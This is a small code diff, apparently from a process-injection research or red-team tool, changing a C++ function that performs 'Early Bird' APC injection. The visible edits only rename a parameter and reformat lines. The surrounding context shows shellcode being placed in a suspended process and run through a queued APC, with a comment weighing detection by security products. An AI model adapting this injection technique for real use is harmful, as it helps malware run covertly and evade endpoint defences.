@@ -5,7 +5,8 @@
 
 namespace scripts {
 
-bool inject_queue_apc_early_bird(const std::wstring& original_image, RemoteProcessMemoryMethod method) {
+bool inject_queue_apc_early_bird(const std::wstring& original_image,
+                                 RemoteProcessMemoryMethod memory_method) {
 
     wprintf(L"\nPreparing a new process\n");
 
@@ -19,7 +20,7 @@ bool inject_queue_apc_early_bird(const std::wstring& original_image, RemoteProce
     wprintf(L"\nPlacing shellcode in the target process\n");
 
     RemoteProcessMemoryContext ctx;
-    ctx.method = method;
+    ctx.method = memory_method;
     ctx.ProcessHandle = process.hProcess.get();
     ctx.Size = (ULONG)default_shellcode_size;
 
@@ -44,7 +45,7 @@ bool inject_queue_apc_early_bird(const std::wstring& original_image, RemoteProce
 
     wprintf(L"  [+] APC queued, HANDLE = 0x%p\n", process.hThread.get());
 
-    // Note:
+    // NOTE:
     // The main advantage of running a suspended process is executing shellcode via APC at the process initialization stage
     // so we don't need to search an alertable thread, APC will be executed immediately
     // On the other hand, running a suspended process and resuming threads are red flags for security solutions
